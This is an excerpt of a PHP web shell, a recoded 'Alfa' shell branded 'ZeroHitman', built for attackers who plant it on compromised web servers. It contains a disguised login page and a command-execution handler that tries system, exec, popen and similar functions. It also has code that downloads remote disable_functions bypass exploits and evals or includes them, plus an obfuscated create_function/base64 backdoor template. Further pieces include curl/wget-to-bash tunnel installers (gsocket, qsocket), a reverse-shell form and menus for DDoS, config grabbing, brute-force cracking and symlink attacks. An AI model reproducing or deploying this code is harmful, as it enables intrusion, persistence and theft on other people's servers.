...
error_reporting(1);
$als="iknow";
$lsa="7e738f353f5410008ef5c04a3ee35eb9";
...
define("__ALFA_DATA_FOLDER__", "logs_tmp");
...
"editor_footer_background" => array(
"key_color" => "rgba(21, 66, 88, 0.93)",
"multi_selector" => array(
".editor-footer" => "background-color: {color};",
)
),
"editor_footer_text" => array(
"key_color" => "#00ff7f",
"multi_selector" => array(
".editor-path" => "color: {color};",
)
),
"editor_footer_button" => array(
"key_color" => "#1d5673",
"multi_selector" => array(
".close-button, .editor-minimize" => "background-color: {color};",
)
...
$config = array('AlfaUser' => $GLOBALS['DB_NAME']['user'],'ssappass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
//@session_start();
@session_write_close();
...
if(isset($_GET['KeyOut'])){echo "<form action='' enctype='multipart/form-data' method='POST'><input type='file' name='filena'><input type='submit' name='zzzzz' value='zzzzz'></form>"; }
...
if (isset($_GET['KeyOut2'])) {echo "<div class='input-group rounded'><form name='clmd_form' method='POST' enctype='multipart/form-data'> COMMAND : <input type='text' name='clmd_input' class='form-control rounded' placeholder='' aria-label='' aria-describedby='search-addon' size='30'><button type='submit' name='clmd_submit' value='gass'>gasss</button></form></div>";} if (isset($_POST['clmd_submit'])) { $clmd = $_POST['clmd_input']; $output = ''; if (function_exists('system')) { exec($clmd, $output, $retval); if ($retval === 0) { echo "Output (system):<br>"; foreach ($output as $line) { echo $line . "<br>"; } echo ""; exit; } } $handle = popen($clmd, 'r'); if ($handle) { while (($line = fgets($handle)) !== false) { $output .= $line; } $retval = pclose($handle); if ($retval === 0) { echo "Output (popen):<br>" . $output . "<br>"; exit; } } if (function_exists('exec')) { exec($clmd, $output, $retval); if ($retval === 0) { echo "Output (exec):<br>"; foreach ($output as $line) { echo $line . "<br>"; } echo ""; exit; } } if (function_exists('passthru')) { ob_start(); passthru($clmd, $retval); $output = ob_get_clean(); if ($retval === 0) { echo "Output (passthru):<br>" . $output . "<br>"; exit; } } if (function_exists('shell_exec')) { $output = shell_exec($clmd); if ($output !== null) { echo "Output (shell_exec):<br>" . $output . "<br>"; exit; } } $descriptorSpec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") ); $process = proc_open($clmd, $descriptorSpec, $pipes); if (is_resource($process)) { while ($s = fgets($pipes[1])) { $output .= $s; } fclose($pipes[1]); fclose($pipes[2]); $retval = proc_close($process); if ($retval === 0) { echo "Output (proc_open):<br>" . $output . "<br>"; exit; } } echo "server tolol,coba pake braja musti"; }
...
if(@$_COOKIE["AlfaUser"] != $config['AlfaUser'] && $_COOKIE['ssappass'] != md5($config['ssappass'])){
if(@$_POST["usrname"]==$config['AlfaUser'] && @md5($_POST["password"])==$config['ssappass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("ssappass", @md5($config['ssappass']));
...
<!-- 616b7520746168752074657461706920616b75206469616d21 -->
  <head>
    ...
    <hr>
    <address>Apache Server at '.$_SERVER['SERVER_ADMIN'].'</address>   
    <style>
      input {
        margin: 0;
...
<br><br><br><center>
  <form method="post">
    <input type="text" name="usrname" required onfocus="if (this.value == \'username\'){this.value = \'\';}">
        <input type="password" name="password" id="YourPassword" required onfocus="if (this.value == \'password\') this.value = \'\';">
        <style>
    .hidden-button {
        display: none;
    }
...
<button type="submit" class="btn hidden-button" name="cok" value="LOGIN">Login</button>

</form>
<!-- 6b756e63692074616b2073656861727573206e796120626572616461206469206c756172 -->
</center>';
exit;
}
}elseif($config['AlfaLoginPage']=='500'){
if(@$_COOKIE["ssappass"] != @md5($config['ssappass'])){
if(@md5($_POST["password"])==$config['ssappass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("ssappass", @md5($config['ssappass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
...
$secret = @$_COOKIE["X-ISPCSESS"];
if(!isset($_COOKIE["X-ISPCSESS"])){
$secret = uniqid(mt_rand(), true);
__alfa_set_cookie("X-ISPCSESS", $secret);
}
return $secret;
}
...
if(!@file_exists(".cache/".$_COOKIE[".cache"].".alfa")){
$recreate = true;
$lang = $_COOKIE[".cache"];
}
}
if(!isset($_COOKIE[".cache"])||$recreate){
...
$cgi_url = __ALFA_DATA_FOLDER__."/.cache/".$lang.$cgi_ext;
...
if($set_cookie){
__alfa_set_cookie(".cache_mode", "off");
}
}
return trim($out);
}else{
...
if (isset($_GET['bdfv1'])) {
    $l = "https://raw.githubusercontent.com/ZeroHitman/pwnstuff/refs/heads/master/php-concat-bypass/exploit.php";
...
if (isset($_GET['bdfv1-l'])) {
$fgc="f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";$fw="f"."w"."r"."i"."t"."e";$fo="f"."o"."p"."e"."n";$fc="f"."c"."l"."o"."s"."e";$memeklodon='sess_'.md5('v1').'.php';$mysql=['https://raw.githubusercontent.com/ZeroHitman/pwnstuff/refs/heads/master/php-concat-bypass/exploit.php',"/tmp/$memeklodon"];if(!file_exists($mysql[1])||filesize($mysql[1])===0){$context=stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false,]]);$kontolodn=$fo($mysql[1],'w+');$fw($kontolodn,$fgc($mysql[0],false,$context));$fc($kontolodn);}include($mysql[1]);exit;}

if (isset($_GET['bdfv2'])) {
    $l = "https://raw.githubusercontent.com/ZeroHitman/pwnstuff/refs/heads/master/php7-gc-bypass/exploit.php";
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $l);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
...
if (isset($_GET['bdfv2-l'])) {
$fgc="f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";$fw="f"."w"."r"."i"."t"."e";$fo="f"."o"."p"."e"."n";$fc="f"."c"."l"."o"."s"."e";$memeklodon='sess_'.md5('v2').'.php';$mysql=['https://raw.githubusercontent.com/ZeroHitman/pwnstuff/refs/heads/master/php7-gc-bypass/exploit.php',"/tmp/$memeklodon"];if(!file_exists($mysql[1])||filesize($mysql[1])===0){$context=stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false,]]);$kontolodn=$fo($mysql[1],'w+');$fw($kontolodn,$fgc($mysql[0],false,$context));$fc($kontolodn);}include($mysql[1]);exit;}

if (isset($_GET['bdfv3'])) {
    $l = "https://raw.githubusercontent.com/ZeroHitman/pwnstuff/refs/heads/master/php-filter-bypass/exploit.php";
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $l);
    ...
    eval('?>' . $body);
exit;}
if (isset($_GET['bdfv3-l'])) {
$fgc="f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";$fw="f"."w"."r"."i"."t"."e";$fo="f"."o"."p"."e"."n";$fc="f"."c"."l"."o"."s"."e";$memeklodon='sess_'.md5('v3').'.php';$mysql=['https://raw.githubusercontent.com/ZeroHitman/pwnstuff/refs/heads/master/php-filter-bypass/exploit.php',"/tmp/$memeklodon"];if(!file_exists($mysql[1])||filesize($mysql[1])===0){$context=stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false,]]);$kontolodn=$fo($mysql[1],'w+');$fw($kontolodn,$fgc($mysql[0],false,$context));$fc($kontolodn);}include($mysql[1]);exit;}


if(isset($_GET["ZeroHitman"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo "<title>ZeroHitman Hidden Shell</title>";
...
<style type="text/css">* {cursor: url(https://cur.cursors-4u.net/symbols/sym-5/sym442.cur), auto !important;}</style><a href="https://www.cursors-4u.com/cursor/2009/10/03/ganesha.html" target="_blank" title="ZeroHitman"><img src="https://cur.cursors-4u.net/cursor.png" border="0" alt="ZeroHitman" style="position:absolute; top: 0px; right: 0px;" /></a>
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?ZeroHitman"><span style="color:#42ff59;">ZeroHitman</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="150" alt="ZeroHitman" draggable="false" src="https://raw.githubusercontent.com/ZeroHitman/ZeroHitman/refs/heads/main/hitman.png" /></td>
</tr>
<tr>
...
CURL :</span>'.$curl.' | <span class="header_vars">
SSH2 : </span>'.$ssh2.' | <span class="header_vars">
Magic Quotes : </span>'.$magic.' | <span class="header_vars"> 
MySQL :</span>'.$mysql.' | <span class="header_vars">
MSSQL :</span>'.$mssql.' | <span class="header_vars"> 
PostgreSQL :</span>'.$pg.' | <span class="header_vars"> 
Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> 
CGI :</span> '.$cgi_shell:"").'</td><td width="15%">
<div id="alfa_solevisible"><center><a href="https://t.me/ZeroHitman" target="_blank"><span><font class="solevisible-text" color="#FFFFFF">~ ZeroHitman ~</font></span></a></center></div></td>
</tr>
<tr>
...
<ul>
';
$li = array('proc'=>'SYSTEM','phpeval'=>'Eval','sql'=>'SQL Manager','bdf'=>'B.D.F PHP V1','bdf2'=>'B.D.F PHP V2','bdf3'=>'B.D.F PHP V3','tunnel'=>'Tunnel','connect'=>'Back Connect',
'dos'=>'DDOS','safe'=>'ByPasser','cgishell'=>'Cgi Shell','ssiShell'=>'SSI SHELL',
'basedir'=>'Open BaseDir','ziper'=>'Compressor','deziper'=>'DeCompressor','pwchanger'=>'Add New Admin','ShellInjectors'=>'Shell Injectors',
'symlink'=>'Symlink','Crackers'=>'BF CRACK ALL','searcher'=>'Searcher','config_grabber'=>'Config Grabber','archive_manager'=>'Archive Manager',
'remotedl'=>'Remote Upload','inbackdoor'=>'Install BackDoor','selfrm'=>'Remove Shell'
);
...
@setcookie("ssappass", null, 2012);
unset($_COOKIE['AlfaUser'],$_COOKIE['ssappass']);
echo("ok");
}
...
$s['alfamini']='https://raw.githubusercontent.com/ZeroHitman/ZeroHitman/refs/heads/main/hitman.png';
$s['loader']='https://raw.githubusercontent.com/ZeroHitman/ZeroHitman/refs/heads/main/hitman.png';
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php error_reporting(0); \n\techo('Alfa Team is Here...!');\n?></textarea></p></div>";
...
$code = '<?php error_reporting(0);  if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$key.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$shell.'");exit;}?>';
...
echo '<div class="header">';
if(empty($about_us)){
$about_us = "<pre><center><img src='https://raw.githubusercontent.com/ZeroHitman/ZeroHitman/refs/heads/main/hitman.png'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Shell ReCoded By ZeroHitman</font><br>
<font color='#00A220'>Original Shell By Alfa Team</font><br>
<font color='#00A220'>Contact : zerohitman007@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @ZeroHitman</font><br>
<font color='#FF0000'>FUCKER</font><br>
<font color='#FF0000'>Independent without a team</font><br>
...
output($ff);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> AndReset Password With Email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
...
if($GLOBALS["DB_NAME"]["cgi_api"]){
if(!isset($_COOKIE[".cache_mode"])&&!isset($_COOKIE[".cache"])){
...
@mkdir('.cache',0755);
__write_file(".cache/".$name, __get_resource($source));
@chmod(".cache/".$name, 0755);
return $temp;
}
...
$data = alfaEx("cd '{$tmp_path}/.cache';sh getheader.alfa",false,true,true);
...
@__write_file('.ssi.shtml',__get_resource($code));
@chmod(".ssi.shtml",0755);
echo AlfaiFrameCreator('.logs_shtml/.ssi.shtml');
echo '</div>';
echo "<div class='editor-footer'>";
echo "</div>";
alfafooter();
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./ZeroHitman Team &copy; 2016-".date('Y')." ]</span><br><span> <span style='letter-spacing: 2px;color: #dfff00;'></span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/'></a></span></div></td>
</tr>
</table>
</div>
...
@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/.cache/getdir.alfa")){
...
}$dirContent = alfaEx("cd ".$tmp_getdir_path."/.cache;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
$s = 'https://storage.haxor-research.com/icon/';
...
<head>
    ...
    <style>
        ...
        .form-control1, textarea {
            border-color: lime; /* Garis border hijau */
            box-shadow: 0 0 10px lime; /* Efek kilau hijau */
            background-color: #2c2d2f; /* Latar belakang hitam */
            color: lime; /* Warna teks menjadi hijau */
        }
        ...
        /* Menyeting textarea agar terletak di tengah secara horizontal */
        textarea {
            margin: 0 auto;
            display: block;
        }
        ...
        .jurus {
            ...
            color: black;
            font-weight: bold;
            text-shadow: 1px 1px 15px lime; /* Efek kilau hijau */
            text-align: center;
        }
        .jurus1 {
            font-family: 'Allerta Stencil', sans-serif;
...
<body>
<br>
<div class='jurus'><a class='jurus' href='" . $_SERVER['PHP_SELF'] . "?bdfv1'>B.D.F PHP</a></div>
</br>
<div class='jurus'><a class='jurus' >or</a></div>
<br>
<div class='jurus'><a class='jurus' href='" . $_SERVER['PHP_SELF'] . "?bdfv1-l'>B.D.F PHP local</a></div>
</br>
<div class='red-text'>Ini hanya untuk bypass disable_functions PHP 7.* - 8.2</div>
    <br><div class='jurus1'>Power By ZeroHitman</div></br>
</form>
</body>
</html>";
echo "<div class='editor-footer'>";
...
<head>
    ...
    <style>
        body {
            background-color: black; /* Latar belakang hitam */color: black; /*Warna teks menjadi hitam */
        }
        .form-control1, textarea {
            border-color: lime; /* Garis border hijau */
            box-shadow: 0 0 10px lime; /* Efek kilau hijau */
...
<body>
<br>
<div class='jurus'><a class='jurus' href='" . $_SERVER['PHP_SELF'] . "?bdfv2'>B.D.F PHP</a></div>
</br>
<div class='jurus'><a class='jurus' >or</a></div>
<br>
<div class='jurus'><a class='jurus' href='" . $_SERVER['PHP_SELF'] . "?bdfv2-l'>B.D.F PHP local</a></div>
</br>
...
<body>
<br>
<div class='jurus'><a class='jurus' href='" . $_SERVER['PHP_SELF'] . "?bdfv3'>B.D.F PHP</a></div>
</br>
<div class='jurus'><a class='jurus' >or</a></div>
<br>
<div class='jurus'><a class='jurus' href='" . $_SERVER['PHP_SELF'] . "?bdfv3-l'>B.D.F PHP local</a></div>
</br>
<div class='red-text'>Ini hanya untuk bypass disable_functions PHP 7.0 - 8.0</div>
    <br><div class='jurus1'>Power By ZeroHitman</div></br>
</form>
</body>
</html>";
...
if($GLOBALS['sys']=="win"){
$process=array(
"WAITING FOR UPDATE" => "ipconfig /all"
);}else{
$process=array(
"INS GS WGET" => "wget --no-check-certificate -qO- https://gsocket.io/y |GS_NOCERTCHECK=1 bash",
"INS GS CURL" => "curl -fsSLk https://gsocket.io/y |GS_NOCERTCHECK=1 bash",
"INS QS WGET" => "wget --no-check-certificate -qO- qsocket.io/0 | bash",
"INS QS CURL" => "curl -fsSLk qsocket.io/0 | bash",
"UNINS GS WGET" => "wget --no-check-certificate -qO- https://gsocket.io/y |GS_UNDO=1 bash",
"UNINS GS CURL" => "curl -fsSLk https://gsocket.io/y |GS_UNDO=1 bash"
);}
foreach($process as $n => $link){
echo '<a href="javascript:void(0);" onclick="g(\'tunnel\',null,\''.$link.'\')"> | '.$n.' | </a>';
}
echo "</center><br>";
if(!empty($_POST['alfa1'])){
...
"Root Sugester"=>"curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash",
...
alfahead();
$php="";
...
echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">IP:</div> <input type='text' style='text-align:center;' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='443'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small></div></p></center></b></font><br>";
...
echo AlfaiFrameCreator('.cgi/'.$cginame);
}else{
echo $resource;
}
}
...
AlfaNum(9,10);
echo __pre().'
<center><p><div class="txtfont_header">| SymlinkFile And Directory |</div></p><form onSubmit="g(\'symlink\',null,null,null,null,\'SymFile\',this.file.value,this.symfile.value,this.symlink.value);return false;" method="post">
...
@mkdir('.sys',0777);
alfacgihtaccess('sym','.sys/');
_alfa_symlink('/','.sys/root');
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/.sys/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/.sys/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/.cgi/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
echo "<div class='editor-footer'>";
...
$bash_users  = alfaEx("cd ".$tmp_path."/.cache;sh basedir.alfa ".$makepwd,false,true,true);
